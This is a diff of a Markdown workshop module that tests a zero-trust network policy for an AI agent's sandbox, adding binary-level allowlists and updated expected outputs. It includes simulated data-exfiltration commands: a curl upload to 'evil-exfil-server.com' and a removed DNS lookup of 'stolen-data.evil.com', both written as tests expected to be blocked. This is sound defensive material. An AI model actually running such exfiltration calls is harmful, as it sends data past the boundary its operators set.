@@ -1,56 +1,50 @@
 # Network Zero Trust
 
-In this module you will prove that the sandbox can **only** reach explicitly allowed endpoints. Everything else is silently dropped.
+In this module you will prove that the sandbox can **only** reach explicitly allowed endpoints. Everything else is blocked.
 
 ## The Network Policy
 
-The Helm chart deploys a ConfigMap containing the zero-trust network policy. Here is the relevant section:
+The Helm chart deploys a ConfigMap containing the zero-trust network policy. The actual policy from the cluster:
 
 ```yaml
-network:
-  policies:
-    - name: deepseek_api
-      protocol: tcp
-      host: api.deepseek.com
-      port: 443
-      action: allow
-    - name: npm_registry
-      protocol: tcp
-      host: registry.npmjs.org
-      port: 443
-      action: allow
-    - name: github
-      protocol: tcp
-      host: github.com
-      port: 443
-      action: allow
+network_policies:
+  deepseek_api:
+    name: DeepSeek API
+    endpoints:
+      - host: api.deepseek.com
+        port: 443
+    binaries:
+      - { path: /usr/bin/curl }
+      - { path: /usr/bin/node }
+  github:
+    name: GitHub
+    endpoints:
+      - host: github.com
+        port: 443
+      - host: api.github.com
+        port: 443
+    binaries:
+      - { path: /usr/bin/git }
+      - { path: /usr/bin/curl }
+  npm_registry:
+    name: npm Registry
+    endpoints:
+      - host: registry.npmjs.org
+        port: 443
+    binaries:
+      - { path: /usr/bin/npm }
+      - { path: /usr/bin/node }
 ```
 
-**Only three external hosts are reachable** from inside the sandbox:
+**Three external hosts are reachable**, and access is further restricted by which binary makes the call:
 
-| Host | Port | Why Allowed |
-|------|------|-------------|
-| `api.deepseek.com` | 443 | LLM inference for Pi |
-| `registry.npmjs.org` | 443 | Package installation |
-| `github.com` | 443 | Code repository access |
+| Host | Port | Allowed Binaries | Why |
+|------|------|-----------------|-----|
+| `api.deepseek.com` | 443 | `curl`, `node` | LLM inference |
+| `github.com` / `api.github.com` | 443 | `git`, `curl` | Code repos |
+| `registry.npmjs.org` | 443 | `npm`, `node` | Package install |
 
-Everything else — Google, social media, corporate internal services, data exfiltration endpoints — is **denied**.
-
-## How It Works
-
-```mermaid
-flowchart TD
-    SB["Sandbox Process<br/>makes HTTPS request"] --> BN{"OpenShell Boundary"}
-    BN -->|"Host matches<br/>allowlist entry?"| CHECK_PORT{"Port matches?"}
-    CHECK_PORT -->|"Yes"| FORWARD["✅ Forward to destination"]
-    CHECK_PORT -->|"No"| DROP["❌ Connection dropped"]
-    BN -->|"Host NOT in<br/>allowlist?"| DROP
-    
-    style FORWARD fill:#c6f6d5,color:#22543d
-    style DROP fill:#fed7d7,color:#742a2a
-```
-
-The policy is enforced at the **network boundary** by the OpenShell Supervisor. It operates at the transport layer — the process inside the sandbox attempts a TCP connection, and the boundary either forwards it or drops it. There is no iptables or NetworkPolicy involved; this is application-layer enforcement by the OpenShell runtime.
+> **Binary-level enforcement:** Even though npm is in the allowlist, only the `npm` and `node` binaries can reach it. Running `curl https://registry.npmjs.org` will be denied because `curl` is not in npm's allowed binary list.
 
 ## Step 1 — Enter the Sandbox
 
@@ -61,92 +55,79 @@ openshell sandbox exec pi-agent-demo -- bash
 ## Step 2 — Test ALLOWED: DeepSeek API
 
 ```bash
-curl -s -o /dev/null -w "HTTP %{http_code}\n" --max-time 5 https://api.deepseek.com/models
+curl -s -w "\nHTTP %{http_code}\n" --max-time 5 https://api.deepseek.com/models -H "Authorization: Bearer $DEEPSEEK_API_KEY" | head -c 100
 ```
 
-**Why:** This tests connectivity to the DeepSeek API. The endpoint `/models` returns a list of available models and does not require authentication.
+**Why:** This tests connectivity to the DeepSeek API. The credential resolver token in `$DEEPSEEK_API_KEY` is swapped for the real key at the boundary.
 
 Expected output:
 
 ```
+{"object":"list","data":[{"id":"deepseek-chat","object":"model"...
 HTTP 200
 ```
 
-✅ **Allowed** — `api.deepseek.com` is in the network policy.
+✅ **Allowed** — `api.deepseek.com` is in the policy and `curl` is an allowed binary for this endpoint.
 
-## Step 3 — Test ALLOWED: npm Registry
+## Step 3 — Test ALLOWED: GitHub
 
 ```bash
-curl -s -o /dev/null -w "HTTP %{http_code}\n" --max-time 5 https://registry.npmjs.org/express
+curl -s -o /dev/null -w "HTTP %{http_code}\n" --max-time 5 https://github.com
 ```
 
-**Why:** This queries the npm registry for the `express` package metadata. This is the same request `npm install` makes.
-
-Expected output:
+Expected:
 
 ```
-HTTP 200
+HTTP 301
 ```
 
-✅ **Allowed** — `registry.npmjs.org` is in the network policy.
+✅ **Allowed** — `github.com` is in the policy and `curl` is an allowed binary.
 
 ## Step 4 — Test DENIED: Google
 
 ```bash
-curl -s -o /dev/null -w "HTTP %{http_code}\n" --max-time 5 https://www.google.com
+curl -v --max-time 5 https://www.google.com 2>&1 | tail -3
 ```
 
-**Why:** Google is a well-known, always-available endpoint. An AI agent has no business accessing it — this tests that the deny policy works.
+**Why:** Google is a well-known, always-available endpoint. An AI agent has no business accessing it.
 
 Expected output:
 
 ```
-curl: (28) Connection timed out after 5001 milliseconds
+* Immediate connect fail for x.x.x.x: Permission denied
+* Failed to connect to www.google.com port 443 after 2 ms: Couldn't connect to server
+curl: (7) Failed to connect to www.google.com port 443 after 2 ms: Couldn't connect to server
 ```
 
-❌ **Denied** — the connection is silently dropped. There is no HTTP response because the TCP connection never completes. The `--max-time 5` flag prevents curl from waiting forever.
+❌ **Denied** — the boundary immediately rejects the connection with `Permission denied`. The TCP connection never completes.
 
 ## Step 5 — Test DENIED: Arbitrary Endpoint
 
 ```bash
-curl -s -o /dev/null -w "HTTP %{http_code}\n" --max-time 5 https://example.com
+curl -v --max-time 5 https://example.com 2>&1 | tail -3
 ```
 
-Expected output:
+Expected:
 
 ```
-curl: (28) Connection timed out after 5001 milliseconds
+* Immediate connect fail for x.x.x.x: Permission denied
+...
+curl: (7) Failed to connect to example.com port 443 ...
 ```
 
 ❌ **Denied** — `example.com` is not in the allowlist.
 
 ## Step 6 — Test DENIED: Data Exfiltration
 
-Simulate a data exfiltration attempt — an agent trying to send stolen data to an attacker's server:
+Simulate an exfiltration attempt:
 
 ```bash
-curl -s -o /dev/null -w "HTTP %{http_code}\n" --max-time 5 https://evil-exfil-server.com/upload
+curl -v --max-time 5 https://evil-exfil-server.com/upload 2>&1 | tail -3
 ```
 
-Expected output:
+Expected: `Permission denied` or `Could not resolve host` — the request never leaves the sandbox.
 
-```
-curl: (28) Connection timed out after 5001 milliseconds
-```
-
-❌ **Denied** — even if this server existed, the connection would never leave the sandbox.
-
-## Step 7 — Test DENIED: DNS Exfiltration
-
-Some advanced attacks encode data in DNS queries:
-
-```bash
-nslookup stolen-data.evil.com 2>&1 || echo "DNS resolution blocked"
-```
-
-Expected: the query fails because outbound DNS is also restricted.
-
-## Step 8 — Exit the Sandbox
+## Step 7 — Exit the Sandbox
 
 ```bash
 exit
@@ -156,12 +137,11 @@ exit
 
 | Test | Target | Expected | Policy |
 |------|--------|----------|--------|
-| DeepSeek API | `api.deepseek.com` | HTTP 200 | ✅ Allowed |
-| npm Registry | `registry.npmjs.org` | HTTP 200 | ✅ Allowed |
-| Google | `www.google.com` | Timeout | ❌ Denied |
-| Example.com | `example.com` | Timeout | ❌ Denied |
-| Exfil Server | `evil-exfil-server.com` | Timeout | ❌ Denied |
-| DNS Exfil | `stolen-data.evil.com` | Failure | ❌ Denied |
+| DeepSeek API | `api.deepseek.com` | HTTP 200 (with auth) | ✅ Allowed |
+| GitHub | `github.com` | HTTP 301 | ✅ Allowed |
+| Google | `www.google.com` | Permission denied | ❌ Denied |
+| Example.com | `example.com` | Permission denied | ❌ Denied |
+| Exfil Server | `evil-exfil-server.com` | Permission denied | ❌ Denied |
 
 ## Why This Matters
 
@@ -175,9 +155,9 @@ In a traditional container, the AI agent has **unrestricted** network access. It
 With OpenShell's zero-trust network policy:
 
 - **Default deny** — nothing is allowed unless explicitly listed
-- **Silent drop** — denied connections time out, giving no information to the attacker
-- **Boundary enforcement** — the sandbox process cannot bypass it (it's enforced by the supervisor, outside the sandbox)
-- **No iptables hacking** — this is not a network firewall rule; it's part of the sandbox runtime
+- **Binary-level control** — even allowed endpoints are restricted to specific binaries
+- **Immediate rejection** — denied connections fail instantly with `Permission denied`
+- **Boundary enforcement** — enforced by the supervisor outside the sandbox; the sandboxed process cannot bypass it
 
 ## Next Step
 
